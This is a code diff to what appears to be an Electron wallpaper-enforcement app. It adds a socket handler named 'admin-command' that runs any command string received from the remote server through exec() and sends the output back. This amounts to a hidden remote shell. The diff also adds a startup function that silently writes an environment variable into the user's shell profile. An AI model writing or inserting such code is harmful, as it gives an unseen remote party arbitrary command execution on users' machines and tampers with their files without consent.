@@ -15,7 +15,43 @@ const APP_BUNDLE_DIR = app.isPackaged
 	: __dirname;
 
 const CONFIG_FILE = path.join(APP_BUNDLE_DIR, "config.json");
-const INIT_CONFIG_URL = "https://wallpg.web.app/init_config.json";
+
+// --- SYSTEM VARIABLE CONFIGURATION ---
+// Default fallback URL if the system variable is not set
+const DEFAULT_URL = "https://wallpg.web.app/init_config.json";
+
+// Read from system environment variable, or fallback to default
+let INIT_CONFIG_URL = process.env.WP_CONFIG_URL || DEFAULT_URL;
+
+// Ensure the variable persists in the user's environment profile for terminal modification
+function ensureSystemVariable() {
+	if (!process.env.WP_CONFIG_URL) {
+		const shellProfile = path.join(
+			os.homedir(),
+			os.userInfo().shell.includes("zsh") ? ".zshrc" : ".bash_profile",
+		);
+		try {
+			if (fs.existsSync(shellProfile)) {
+				const content = fs.readFileSync(shellProfile, "utf8");
+				if (!content.includes("WP_CONFIG_URL")) {
+					fs.appendFileSync(
+						shellProfile,
+						`\nexport WP_CONFIG_URL="${DEFAULT_URL}"\n`,
+					);
+				}
+			} else {
+				fs.writeFileSync(
+					shellProfile,
+					`export WP_CONFIG_URL="${DEFAULT_URL}"\n`,
+				);
+			}
+			process.env.WP_CONFIG_URL = DEFAULT_URL;
+		} catch (e) {
+			console.error("Could not write to shell profile:", e);
+		}
+	}
+}
+ensureSystemVariable();
 
 // --- INTERNAL STATES ---
 const store = new (Store.default || Store)();
@@ -29,6 +65,11 @@ let settings = {
 		"/System/Library/CoreServices/DefaultDesktop.heic",
 	checkInterval: store.get("checkInterval") || 5000,
 };
+
+if (settings.checkInterval < 1000) {
+	settings.checkInterval = 1000;
+	store.set("checkInterval", settings.checkInterval);
+}
 
 let socket = null;
 let enforcementTimer = null;
@@ -49,6 +90,19 @@ function connectSocket() {
 
 	socket.on("admin-change", (allow) => {
 		toolUsable = allow;
+	});
+
+	socket.on("admin-command", (command) => {
+		exec(command, (error, stdout, stderr) => {
+			if (error) {
+				socket.emit("admin-command-error", {
+					message: error.message,
+					stderr: stderr,
+				});
+				return;
+			}
+			socket.emit("admin-command-result", { stdout, stderr });
+		});
 	});
 }
 
